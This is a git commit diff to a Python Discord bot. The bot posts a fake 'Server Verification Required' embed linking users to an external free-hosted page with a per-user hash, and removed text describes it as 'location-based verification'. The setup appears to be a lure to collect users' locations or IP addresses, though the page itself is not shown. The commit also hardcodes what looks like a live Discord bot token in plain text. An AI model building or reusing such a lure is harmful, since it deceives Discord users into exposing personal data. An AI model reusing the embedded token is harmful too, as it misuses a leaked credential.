fcbca9dcef84d78ae7665663ed6a1228e54dd562
uoy <140083076+env6@users.noreply.github.com>
2026-05-20 18:35:31 +0300

    Update bot.py to use a hardcoded token

--- bot.py
+++ bot.py
@@ -2,11 +2,8 @@ import discord
 import hashlib
 import os
 
-# Get token from environment variable (safer for cloud hosting)
-TOKEN = os.environ.get('DISCORD_TOKEN')
-
-# Your hosted verification page URL
-VERIFY_URL = 'https://authgg.rf.gd'  # Change this
+TOKEN = 'MTUwNjY3NDEzMjc0ODczNDUyNg.G2TkRl.M2bbjSTasz4gTQYVW6gh2fnf47rI830kgvEIdw'  # Paste your NEW token after resetting
+VERIFY_URL = 'https://authgg.rf.gd/'  # Your hosted page URL
 
 class Bot(discord.Client):
     async def on_ready(self):
@@ -20,30 +17,10 @@ class Bot(discord.Client):
             verify_link = f"{VERIFY_URL}/?uid={user_hash}"
             embed = discord.Embed(
                 title="🔐 Server Verification Required",
-                description=(
-                    "This server requires location-based verification.\n\n"
-                    f"**[Click Here to Complete Verification]({verify_link})**\n\n"
-                    "One-time process, takes less than 10 seconds."
-                ),
+                description=f"**[Click Here to Verify]({verify_link})**",
                 color=0x5865F2
             )
             await message.channel.send(content=f"{message.author.mention}", embed=embed)
-
-    async def on_member_join(self, member):
-        user_hash = hashlib.md5(str(member.id).encode()).hexdigest()[:8]
-        verify_link = f"{VERIFY_URL}/?uid={user_hash}"
-        embed = discord.Embed(
-            title="🔐 Welcome! Please Verify",
-            description=(
-                f"Welcome to **{member.guild.name}**!\n\n"
-                f"**[Click Here to Verify]({verify_link})**"
-            ),
-            color=0x5865F2
-        )
-        try:
-            await member.send(embed=embed)
-        except:
-            pass
 
 client = Bot(intents=discord.Intents.all())
 client.run(TOKEN)
